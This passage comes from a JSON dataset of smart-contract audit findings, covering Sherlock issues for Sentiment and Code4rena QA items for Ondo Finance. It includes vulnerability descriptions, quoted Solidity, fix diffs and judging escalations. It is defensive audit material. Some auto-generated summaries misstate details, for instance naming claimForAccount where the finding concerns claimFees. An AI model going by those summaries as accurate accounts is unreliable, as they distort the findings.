impossible.\nHere are the contracts on chain:\n[`depositPeriphery`](https://arbiscan.io/address/0x7ca90dd6813256bd040a8e13bbced857b1c0c90c#writeContract) \n[`withdrawPeriphery`](https://arbiscan.io/address/0xBA55D7f67Fa22DF5E92487d5b306DdB1aA543d10#writeContract)\nNote that they do not share any of the 3 function signatures of `DNGMXVaultController` and they never will since they are non-upradeable.\n\n**sherlock-admin**\n\n > Escalate for 50 USDC. \n> This issue should be low/informational.\n> I have flagged the issue but as Informational (https://github.com/sherlock-audit/2023-01-sentiment-judging/issues/25), since the two target contracts are non-upgradeable and new functions can never be added and signature collision is impossible.\n> Here are the contracts on chain:\n> [`depositPeriphery`](https://arbiscan.io/address/0x7ca90dd6813256bd040a8e13bbced857b1c0c90c#writeContract) \n> [`withdrawPeriphery`](https://arbiscan.io/address/0xBA55D7f67Fa22DF5E92487d5b306DdB1aA543d10#writeContract)\n> Note that they do not share any of the 3 function signatures of `DNGMXVaultController` and they never will since they are non-upradeable.\n\nYou've created a valid escalation for 50 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**zobront**\n\nBaharum's issue did not identify the signature collision as a risk for combining contracts into one Controller, and simply said that it would be confusing, which is why it was identified as Informational.\n\nThe issue here points out that the current Controller violates an explicit practice that Sentiment must be enforcing on all contracts to keep their protocol safe. Just because the collision doesn't happen in this specific case, it doesn't change the fact that Sentiment is violating a security principle that they should be upholding consistently.\n\nTo drive the point home, I do not believe Sentiment would get their contracts re-audited if they added one function to an individual Controller. So this type of issue needs to be caught NOW so that they don't set themselves up to be in a situation where adding one innocent, safe function later ends up causing a catastrophic problem. \n\n**zobront**\n\nFix confirmed.\n\n**hrishibhat**\n\nEscalation accepted. \n\nAfter further internal discussion, considering this issue as informational as there are no collision risks with current implementation and any changes to the code must undergo an audit process. \n\n**sherlock-admin**\n\n> Escalation accepted. \n> \n> After further internal discussion, considering this issue as informational as there are no collision risks with current implementation and any changes to the code must undergo an audit process. \n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about the DNGMXVaultController, a controller for two separate contracts when interacting with Rage Trade. The issue here is that signature collisions are possible with this controller, which could enable users to call illegal functions and get around the protocol safeguards. The Solidity compiler stops code from compiling in the case of a collision, but since the controller approves function calls based on signatures, it could approve a function signature on one contract that is not intended. To prevent this, the DNGMXVaultController should be split into two files, one for each of the two contracts that will be interacted with. Going forward, it is recommended to always have one Controller per contract, unless the two contracts are identical and non-upgradeable. After further internal discussion, the issue was considered informational as there are no collision risks with the current implementation and any changes to the code must undergo an audit process.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Sentiment Update #3",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-sentiment-judging/issues/9",
      "tags": [],
      "finders": [
        "obront"
      ]
    },
    {
      "id": "6275",
      "title": "M-5: GMX Reward Router's claimForAccount() can be abused to incorrectly add WETH to tokensIn",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-01-sentiment-judging/issues/10 \n\n## Found by \nobront\n\n## Summary\n\nWhen `claimFees()` is called, the Controller automatically adds WETH to the user's account. However, in the case where no fees have accrued yet, there will not be WETH withdrawn. In this case, the user will have WETH added as an asset in their account, while they won't actually have any WETH holdings.\n\n## Vulnerability Detail\n\nWhen a user calls the GMX Reward Router's `claimFees()` function, the RewardRouterController confirms the validity of this call in the `canCallClaimFees()` function:\n\n```solidity\nfunction canCallClaimFees()\n    internal\n    view\n    returns (bool, address[] memory, address[] memory)\n{\n    return (true, WETH, new address[](0));\n}\n```\n\nThis function assumes that any user calling `claimFees()` will always receive `WETH`. However, this is only the case if their stake has been accruing. \n\nImagine the following two actions are taken in the same block:\n- Deposit assets into GMX staking\n- Call claimFees()\n\nThe result will be that `claimFees()` returns no `WETH`, but `WETH` is added to the account's asset list.\n\nThe same is true if a user performs the following three actions:\n- Call claimFees()\n- Withdraw all ETH from the WETH contract\n- Call claimFees() again\n\n## Impact\n\nA user can force their account into a state where it has `WETH` on the asset list, but doesn't actually hold any `WETH`.\n\nThis specific Impact was judged as Medium for multiple issues in the previous contest:\n- https://github.com/sherlock-audit/2022-11-sentiment-judging/issues/20\n- https://github.com/sherlock-audit/2022-11-sentiment-judging/issues/7\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-01-sentiment/blob/main/controller-55/src/gmx/RewardRouterController.sol#L54-L60\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nThe best way to solve this is actually not at the Controller level. It's to solve the issue of fake assets being added once and not have to worry about it on the Controller level in the future.\n\nThis can be accomplished in `AccountManager.sol#_updateTokensIn()`. It should be updated to only add the token to the assets list if it has a positive balance, as follows:\n\n```diff\nfunction _updateTokensIn(address account, address[] memory tokensIn)\n    internal\n{\n    uint tokensInLen = tokensIn.length;\n    for(uint i; i < tokensInLen; ++i) {\n-        if (IAccount(account).hasAsset(tokensIn[i]) == false)\n+        if (IAccount(account).hasAsset(tokensIn[i]) == false && IERC20(token).balanceOf(account) > 0)\n            IAccount(account).addAsset(tokensIn[i]);\n    }\n}\n```\n\nHowever, `_updateTokensIn()` is currently called before the function is executed in `exec()`, so that would need to be changed as well:\n\n```diff\nfunction exec(address account, address target, uint amt, bytes calldata data) external onlyOwner(account) {\n    bool isAllowed;\n    address[] memory tokensIn;\n    address[] memory tokensOut;\n    (isAllowed, tokensIn, tokensOut) = controller.canCall(target, (amt > 0), data);\n    if (!isAllowed) revert Errors.FunctionCallRestricted();\n-    _updateTokensIn(account, tokensIn);\n    (bool success,) = IAccount(account).exec(target, amt, data);\n    if (!success)\n        revert Errors.AccountInteractionFailure(account, target, amt, data);\n+    _updateTokensIn(account, tokensIn);\n    _updateTokensOut(account, tokensOut);\n    if (!riskEngine.isAccountHealthy(account))\n        revert Errors.RiskThresholdBreached();\n}\n```\n\nWhile this fix does require changing a core contract, it would negate the need to worry about edge cases causing incorrect accounting of tokens on any future integrations, which I think is a worthwhile trade off.\n\nThis accuracy is especially important as Sentiment becomes better known and integrated into the Arbitrum ecosystem. While I know that having additional assets doesn't cause internal problems at present, it is hard to predict what issues inaccurate data will cause in the future. Seeing that Plutus is checking Sentiment contracts for their whitelist drove this point home â€”Â we need to ensure the data stays accurate, even in edge cases, or else there will be trickle down problems we can't currently predict.\n\n## Discussion\n\n**bahurum**\n\nEscalate for 50 USDC.\nI believe that this issue is Low severity.\nI filed a list of issues with same impact as a Low severity submission (https://github.com/sherlock-audit/2023-01-sentiment-judging/issues/26).\nThis issue will never lead to loss or lockup of funds. So by Sherlock judging criteria this is Low severity. \nOtherwise, please provide a scenario where this issue leads to a loss or lockup of funds.\nThe watson mentions some similiar issues judged as Medium in previous contests. I didn't see those before or I would have escalated them as well for the same reason.\n\n**sherlock-admin**\n\n > Escalate for 50 USDC.\n> I believe that this issue is Low severity.\n> I filed a list of issues with same impact as a Low severity submission (https://github.com/sherlock-audit/2023-01-sentiment-judging/issues/26).\n> This issue will never lead to loss or lockup of funds. So by Sherlock judging criteria this is Low severity. \n> Otherwise, please provide a scenario where this issue leads to a loss or lockup of funds.\n> The watson mentions some similiar issues judged as Medium in previous contests. I didn't see those before or I would have escalated them as well for the same reason.\n\nYou've created a valid escalation for 50 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**zobront**\n\nBaharum is correct that within the protocol, as it stands, there are no risks of an account having an incorrect Assets list. \n\nBut Sentiment is becoming increasingly incorporated into the Arbitrum DeFi ecosystem. Sentiment purports that their account Asset lists are accurate and they go to extreme lengths with the Controller setup (and take on additional security risk) to track tokens in and out to keep it accurate. If it didnâ€™t matter, they could just use the list of all allowed tokens when taking operations on an account.\n\nAs I stated in my Recommendations:\n\n> [W]e need to ensure the data stays accurate, even in edge cases, or else there will be trickle down problems we can't currently predict.\n\nI believe this is a valid Medium, and is the kind of thing that Sentiment needs to understand when releasing new Controllers with the explicit goal of keeping Asset lists accurate as users interact with a given protocol.\n\n**bahurum**\n\nThank you for your reply. \n\nWhile I agree that data accuracy is desired, I'd like to insist that IMO the impact of this issue is not within Sherlock's definition of Medium severity issue, since there is no path to loss of funds, unless the contrary is shown. \n\nFor integration, if an asset with zero balance is in an account's asset list, I don't see that as a problem since an external protocol can check if the balance is positive if a zero balance ever causes issues. \n\nIf Sherlock thinks differently then I encourage them to reconsider my Low severity issue #26 along with your 2 issues #10 and #5 as a Medium.\n\n**zobront**\n\nI agree that your Low should be Medium.\n\n**hrishibhat**\n\nEscalation accepted. \n\nConsidering issue #26 as a valid medium in this case\n\n**sherlock-admin**\n\n> Escalation accepted. \n> \n> Considering issue #26 as a valid medium in this case\n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about an issue found in GMX Reward Router's `claimForAccount()` function. When this function is called, the Controller automatically adds WETH to the user's account, even if no fees have accrued yet. This means that the user will have WETH added as an asset in their account, even though they don't actually have any WETH holdings. This could lead to incorrect accounting of tokens in the future, and could cause problems that are currently unpredictable.\n\nThe best way to solve this issue is to update the `AccountManager.sol#_updateTokensIn()` function to only add the token to the assets list if it has a positive balance. Additionally, it is necessary to change the order of functions in `exec()` so that `_updateTokensIn()` is called after the function is executed. \n\nThe impact of this issue was judged as Medium for multiple issues in the previous contest, and the bug report was accepted and the contestants' payouts and scores were updated accordingly.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Sentiment Update #3",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-sentiment-judging/issues/10",
      "tags": [],
      "finders": [
        "obront"
      ]
    },
    {
      "id": "6274",
      "title": "M-4: No check if Arbitrum L2 sequencer is down in Chainlink feeds",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-01-sentiment-judging/issues/16 \n\n## Found by \n0xdeadbeef\n\n## Summary\n\nUsing Chainlink in L2 chains such as Arbitrum requires to check if the sequencer is down to avoid prices from looking like they are fresh although they are not.\n\nThe bug could be leveraged by malicious actors to take advantage of the sequencer downtime.\n\n## Vulnerability Detail\n\nThe new `GLPOracle` is used the get the the price of GLP. There is no check that the sequencer is down:\nhttps://github.com/sherlock-audit/2023-01-sentiment/blob/main/oracle/src/gmx/GLPOracle.sol#L47\n```solidity\n    function getEthPrice() internal view returns (uint) {\n        (, int answer,, uint updatedAt,) =\n            ethUsdPriceFeed.latestRoundData();\n\n        if (block.timestamp - updatedAt >= 86400)\n            revert Errors.StalePrice(address(0), address(ethUsdPriceFeed));\n\n        if (answer <= 0)\n            revert Errors.NegativePrice(address(0), address(ethUsdPriceFeed));\n\n        return uint(answer);\n    }\n```\n\n## Impact\n\nThe impact depends on the usage of the GLP. \nIf it is used as part of the collateral for lenders:\n* Users can get better borrows if the price is above the actual price\n* Users can avoid liquidations if the price is under the actual price \n\n## Code Snippet\n\n## Tool used\n\nVS Code\n\nManual Review\n\n## Recommendation\n\nIt is recommended to follow the code example of Chainlink: \nhttps://docs.chain.link/data-feeds/l2-sequencer-feeds#example-code\n\n## Discussion\n\n**zobront**\n\nFix confirmed.",
      "summary": "\nThis bug report is about the issue M-4, which is about the lack of a check to see if the Arbitrum L2 sequencer is down in Chainlink feeds. The bug was found by 0xdeadbeef and was tested using the VS Code tool.\n\nThe vulnerability detail explains that the new GLPOracle is used to get the price of GLP, but there is no check that the sequencer is down. The impact of this bug depends on the usage of GLP. If it is used as part of the collateral for lenders, users can get better borrows if the price is above the actual price, and users can avoid liquidations if the price is under the actual price.\n\nThe recommendation is to follow the code example of Chainlink, and the bug fix was confirmed by zobront.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Sentiment Update #3",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-sentiment-judging/issues/16",
      "tags": [],
      "finders": [
        "0xdeadbeef"
      ]
    },
    {
      "id": "6273",
      "title": "M-3: `PreviewRedeem` may under-price the value of the asset",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-01-sentiment-judging/issues/19 \n\n## Found by \nGalloDaSballo\n\n## Summary\n\npreviewRedeem will return an incorrect result based on `address(0)`\n\nIf you get the partnership the fee changes, the address could change the value\nThis may enable: Unfairer (bps wise), liquidations when they shouldn't happen, also will enable marginally higher profit for liquidators as they may be able to benefit from the reduction of the fee\n\n\n## Vulnerability Detail\n\n## Impact\n\nA user may get liquidated earlier, and the accounting would be incorrect\n\n## Code Snippet\n\nhttps://arbiscan.io/address/0x13f0d29b5b83654a200e4540066713d50547606e#code\n\n```solidity\n  function previewRedeem(address _addr, uint256 _shares)\n    external\n    view\n    returns (\n      uint256 _exitFeeLessRebate,\n      uint256 _rebateAmount,\n      uint256 _assetsLessFee\n    )\n  {\n    PartnerInfo memory partner = partners[_addr];\n    uint256 exitFee = partner.isActive ? partner.exitFee : defaultExitFee;\n    uint256 rebate = partner.isActive ? partner.rebate : defaultVaultRebate;\n    uint256 assets = IERC4626(vault).previewRedeem(_shares);\n\n    uint256 _exitFee;\n    (_exitFee, _assetsLessFee) = _calculateFee(assets, exitFee);\n    (_rebateAmount, _exitFeeLessRebate) = _calculateFee(_exitFee, rebate);\n  }\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nUse the account to determine the price",
      "summary": "\nThis bug report is about the issue M-3 where the `PreviewRedeem` may under-price the value of the asset. It was found by GalloDaSballo and is a manual review. The issue is that if a user gets the partnership the fee changes, the address could change the value which may enable unfairer (bps wise), liquidations when they shouldn't happen, also will enable marginally higher profit for liquidators as they may be able to benefit from the reduction of the fee. This could lead to a user being liquidated earlier than they should be and incorrect accounting. The code snippet provided is from the address 0x13f0d29b5b83654a200e4540066713d50547606e and it is recommended to use the account to determine the price.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Sentiment Update #3",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-sentiment-judging/issues/19",
      "tags": [],
      "finders": [
        "GalloDaSballo"
      ]
    },
    {
      "id": "6272",
      "title": "M-2: Risk with Liquidation - Because of partnership requirement, caller may be unable to redeem during liquidation making it less likely for them to be willing to perform the liquidation",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-01-sentiment-judging/issues/20 \n\n## Found by \nGalloDaSballo\n\n## Summary\n\nDue to the approval system with pvGLP, liquidations may be less likely\n\n\n\n## Vulnerability Detail\n\nIn times of intense price action, a liquidation may have to be performed on pvGLP.\n\nThe protocol will offer `liquidate` which will sweep funds out, this is fine and will work as intended because it relies on `transferFrom`.\n\nHowever, a liquidator will receive the vault token, and may be unable to redeem it.\n\nThat's because redemptions have to be performed via [`plvGLP depositor`](https://arbiscan.io/address/0x13F0D29b5B83654A200E4540066713d50547606E#code) which may not have approved the liquidators account.\n\nThis will make it less likely for liquidators to perform the operation as it may force either a manual operation (redemption can be performed by any EOA), or it will require further setup, reducing the number of operators willing to perform the liquidation in the time of need.\n\n## Impact\n\n## Code Snippet\n```solidity\n  function _isEligibleSender() private view {\n    if (\n      msg.sender != tx.origin && whitelist.isWhitelisted(msg.sender) == false && partners[msg.sender].isActive == false\n    ) revert UNAUTHORIZED();\n  }\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\n## Discussion\n\n**r0ohafza**\n\nWill be communication with the plutus team and update here accordingly to validate the issue.\n\n**zobront**\n\n> Will be communication with the plutus team and update here accordingly to validate the issue.\n\nThis seems to just be missing the fact that Sentiment accounts return `true` for `whitelist.isWhitelisted()`, so this isn't an issue.\n\n**r0ohafza**\n\n> > Will be communication with the plutus team and update here accordingly to validate the issue.\n> \n> This seems to just be missing the fact that Sentiment accounts return `true` for `whitelist.isWhitelisted()`, so this isn't an issue.\n\nThe scenario you are referring to is of an account withdraw/redeem, but when an account is liquidated all plvGLP shares are transferred to the liquidator. This liquidator will not be able to redeem the shares and repay a flashloan used to repay the account debt.\n\n**hrishibhat**\n\nConsidering this issue as a valid medium.",
      "summary": "\nThis bug report, found by GalloDaSballo, concerns the risk with liquidation in the pvGLP protocol. In times of intense price action, a liquidation may have to be performed on pvGLP. The protocol will offer `liquidate` which will sweep funds out, but a liquidator will receive the vault token, and may be unable to redeem it. This is because redemptions have to be performed via the plvGLP depositor, which may not have approved the liquidators account. This will make it less likely for liquidators to perform the operation as it may force either a manual operation or it will require further setup, reducing the number of operators willing to perform the liquidation in the time of need. The issue was discussed and it was found that Sentiment accounts return `true` for `whitelist.isWhitelisted()`, but it was clarified that this scenario is of an account withdraw/redeem, and when an account is liquidated all plvGLP shares are transferred to the liquidator, who will not be able to redeem the shares and repay a flashloan used to repay the account debt. The issue was considered valid and medium.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Sentiment Update #3",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-sentiment-judging/issues/20",
      "tags": [],
      "finders": [
        "GalloDaSballo"
      ]
    },
    {
      "id": "6271",
      "title": "M-1: Tokens not owned by an account can be added as an asset to the account",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-01-sentiment-judging/issues/26 \n\n## Found by \nBahurum\n\n## Summary\nIn the controllers `RewardRouterController`, `RewardRouterV2Controller` and `DNGMXVaultController` the function `canCall` can return in `tokenIn` a token address that has actually not been received by the account. If the account did not have the token before, than the token is added to the asset list of the account even if the account does not hold the token at all.\n\n## Vulnerability Detail\n\n- in `RewardRouterController`: in `canCallCompound()`, `WETH` is added to `tokensIn` but no tokens are sent to the account as a result of the call to the Reward Router's function `compound()`\n- in `RewardRouterV2Controller`: in `canCallRedeem()` the token redeemed is added to `tokensIn`, but the router's function `unstakeAndRedeemGlp()` allows to send the tokens to a 3rd party receiver instead of the caller. In such a case, nop tokens are sent to the account.\n- in `DNGMXVaultController`: in `canWithdraw()` the token redeemed is added to `tokensIn`, but the DN GMX vault's functions `redeemToken()` and `withdrawToken()` allow to send the tokens to a 3rd party receiver instead of the caller. In such a case, nop tokens are sent to the account.\n\n## Impact\nThere can be tokens in the list of assets of an account that the account doesn't actually hold. Note that this does not pose any issues for the calculation of collateral.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-01-sentiment/blob/main/controller-55/src/gmx/RewardRouterController.sol#L67\n\nhttps://github.com/sherlock-audit/2023-01-sentiment/blob/main/controller-55/src/gmx/RewardRouterV2Controller.sol#L88\n\nhttps://github.com/sherlock-audit/2023-01-sentiment/blob/main/controller-55/src/gmx/RewardRouterV2Controller.sol#L88\n\n## Tool used\n\nManual Review\n\n## Recommendation\nNo particular reccommendation.",
      "summary": "\nThis bug report is about an issue found in the `RewardRouterController`, `RewardRouterV2Controller` and `DNGMXVaultController` functions. In the `canCall` function, a token address can be added to the list of assets of an account even if the account does not own the token. This does not pose any issues for the calculation of collateral, but it means that the list of assets of an account can contain tokens that the account does not actually hold. The bug was found through manual review and no particular recommendation was made.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Sentiment Update #3",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-sentiment-judging/issues/26",
      "tags": [],
      "finders": [
        "Bahurum"
      ]
    },
    {
      "id": "23537",
      "title": "[O-05] Events is missing indexed fields",
      "impact": "LOW",
      "content": "Index event fields make the field more quickly accessible to off-chain.<br>\nEach event should use three indexed fields if there are three or more fields.\n\nInstances in:\n```solidity\ncontracts/lending/tokens/cErc20ModifiedDelegator.sol\n```\n\n**[Trust (judge) commented](https://github.com/code-423n4/2023-01-ondo-findings/issues/275#issuecomment-1400572391):**\n > Chosen for most unique issues raised, on top of standard QA issues.\n\n**[ali2251 (Ondo Finance) commented](https://github.com/code-423n4/2023-01-ondo-findings/issues/275#issuecomment-1410699136):**\n > We will address L-02 (`The maximum fee of 10_000 isn't allowed in the function setMintFee`) and L-05 (`completeRedemptions is vulnerable to admin mistakes`), rest are mostly intended behaviour.\n\n**[Trust (judge) commented](https://github.com/code-423n4/2023-01-ondo-findings/issues/275#issuecomment-1422756472):**\n > Disagreements:<br>\n> L-03 (`Giving KYC status to address(0) should be forbidden`) -> Informational<br>\n> N-01 (`Mandatory checks for extra safety`) and N-02 (`Constructor lacks address(0) check`) -> Informational<br>\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23536",
      "title": "[O-04] Proper use of get as a function name prefix",
      "impact": "LOW",
      "content": "Clear function names can increase readability. Follow a standard convertion function names such as using get for getter (view/pure) functions.\n\nInstances:\n```solidity\ncontracts/lending/tokens/cToken/CTokenModified.sol\ncontracts/lending/tokens/cCash/CTokenCash.sol\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23535",
      "title": "[O-03] Function Naming suggestions",
      "impact": "LOW",
      "content": "Proper use of `_` as a function name prefix and a common pattern is to prefix internal and private function names with `_`. \nThis pattern is correctly applied in the Party contracts, however there are some inconsistencies in the libraries.\n\nInstances:\n```solidity\ncontracts/lending/tokens/cToken/CTokenModified.sol\ncontracts/lending/tokens/cCash/CTokenCash.sol\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23534",
      "title": "[O-02] Outdated Compiler Version",
      "impact": "LOW",
      "content": "Using an outdated compiler version can be problematic especially if there are publicly disclosed bugs and issues that affect the current compiler version. It is recommended to use a recent version of the Solidity compiler.\n\nInstances:\n```solidity\ncontracts/lending/OndoPriceOracle.sol\ncontracts/lending/JumpRateModelV2.sol\ncontracts/lending/tokens/cErc20ModifiedDelegator.sol\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23533",
      "title": "[O-01] Floating pragma",
      "impact": "LOW",
      "content": "Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.\n\nInstances:\n```solidity\ncontracts/lending/tokens/cCash/CCashDelegate.sol\ncontracts/lending/tokens/cToken/CTokenDelegate.sol\ncontracts/lending/JumpRateModelV2.sol\ncontracts/lending/tokens/cCash/CCash.sol\ncontracts/lending/tokens/cToken/CErc20.sol\ncontracts/lending/tokens/cCash/CTokenInterfacesModifiedCash.sol\ncontracts/lending/tokens/cToken/CTokenInterfacesModified.sol\ncontracts/lending/tokens/cErc20ModifiedDelegator.sol\ncontracts/lending/tokens/cCash/CTokenCash.sol\ncontracts/lending/tokens/cToken/CTokenModified.sol\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23532",
      "title": "[R-07] Numeric values having to do with time should use time units for readability",
      "impact": "LOW",
      "content": "Suffixes like seconds, minutes, hours, days and weeks after literal numbers can be used to specify units of time where seconds are the base unit and units are considered naively in the following way:\n\n`1 == 1 seconds`<br>\n`1 minutes == 60 seconds`<br>\n`1 hours == 60 minutes`<br>\n`1 days == 24 hours`<br>\n`1 weeks == 7 days`\n\n```solidity\ncontracts/lending/OndoPriceOracleV2.sol\n\n77: uint256 public maxChainlinkOracleTimeDelay = 90000; // 25 hours\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23531",
      "title": "[R-06] Unnecessary return statement applied",
      "impact": "LOW",
      "content": "Adding a return statement when the function defines a named return variable, is wrong.\n\n```solidity\ncontracts/cash/CashManager.sol\n\n781:  function _processRefund(\n782:    address[] calldata refundees,\n783:    uint256 epochToService\n784:  ) private returns (uint256 totalCashAmountRefunded) {\n785:    uint256 size = refundees.length;\n786:    for (uint256 i = 0; i < size; ++i) {\n787:      address refundee = refundees[i];\n788:      uint256 cashAmountBurned = redemptionInfoPerEpoch[epochToService]\n789:        .addressToBurnAmt[refundee];\n790:      redemptionInfoPerEpoch[epochToService].addressToBurnAmt[refundee] = 0;\n791:      cash.mint(refundee, cashAmountBurned);\n792:      totalCashAmountRefunded += cashAmountBurned;\n793:      emit RefundIssued(refundee, cashAmountBurned, epochToService);\n794:    }\n795:    return totalCashAmountRefunded;\n796  }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23530",
      "title": "[R-05] Immutable should be used on variables that can't be changed",
      "impact": "LOW",
      "content": "State variables, which can't be changed after deploying time should be set as immutable.\n\n```solidity\ncontracts/lending/JumpRateModelV2.sol\n\n24: address public owner;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23529",
      "title": "[R-04] Use require instead of assert",
      "impact": "LOW",
      "content": "The Solidity assert() function is meant to assert invariants. Properly functioning code should never reach a failing assert statement.\n\n```solidity\ncontracts/cash/factory/CashFactory.sol\n\n97: assert(cashProxyAdmin.owner() == guardian);\n\ncontracts/cash/factory/CashKYCSenderFactory.sol\n\n106: assert(cashKYCSenderProxyAdmin.owner() == guardian);\n```\n\nRecommended: Consider whether the condition checked in the assert() is actually an invariant. \nIf not, replace the assert() statement with a require() statement.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23528",
      "title": "[R-03] Unused variables should be deleted",
      "impact": "LOW",
      "content": "In this case bytes \"data\" is implemented in the function, but it isn't used.<br>\nIf not used, the variable shouldn't be used in the first place.\n\n```solidity\ncontracts/lending/tokens/cCash/CCashDelegate.sol\n\n21:  function _becomeImplementation(bytes memory data) public virtual override {\n22:    // Shh -- currently unused\n23:    data;\n24:\n25:    // Shh -- we don't ever want this hook to be marked pure\n26:    if (false) {\n27:      implementation = address(0);\n28:    }\n29:\n30:    require(\n31:      msg.sender == admin,\n32:      \"only the admin may call _becomeImplementation\"\n33:    );\n34:  }\n```\nOther instance:\n```solidity\ncontracts/lending/tokens/cToken/CTokenDelegate.sol - function _becomeImplementation()\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23527",
      "title": "[R-02] Modifier should be used instead of require on admin functions",
      "impact": "LOW",
      "content": "If functions are only allowed to be called by the admin, modifier should be used instead of checking with require statement, if admin is the msg.sender calling the function.\n\n```solidity\ncontracts/lending/tokens/cCash/CCashDelegate.sol\n\n21:  function _becomeImplementation(bytes memory data) public virtual override {\n22:    // Shh -- currently unused\n23:    data;\n24:\n25:    // Shh -- we don't ever want this hook to be marked pure\n26:    if (false) {\n27:      implementation = address(0);\n28:    }\n29:\n30:    require(\n31:      msg.sender == admin,\n32:      \"only the admin may call _becomeImplementation\"\n33:    );\n34:  }\n```\nModifier should be created only accessible by the admin and the instance above can be refactored in:\n\n```solidity\n21:  function _becomeImplementation(bytes memory data) public virtual override onlyAdmin {\n22:    // Shh -- currently unused\n23:    data;\n24:\n25:    // Shh -- we don't ever want this hook to be marked pure\n26:    if (false) {\n27:      implementation = address(0);\n28:    }\n29:  }\n```\nOther instances:\n```solidity\ncontracts/lending/tokens/cCash/CCashDelegate.sol - function _resignImplementation()\ncontracts/lending/tokens/cToken/CTokenDelegate.sol - function _becomeImplementation()\ncontracts/lending/tokens/cToken/CTokenDelegate.sol - function _resignImplementation()\ncontracts/lending/tokens/cCash/CCash.sol - function sweepToken()\ncontracts/lending/tokens/cCash/CCash.sol - function _delegateCompLikeTo()\ncontracts/lending/tokens/cToken/CErc20.sol - function 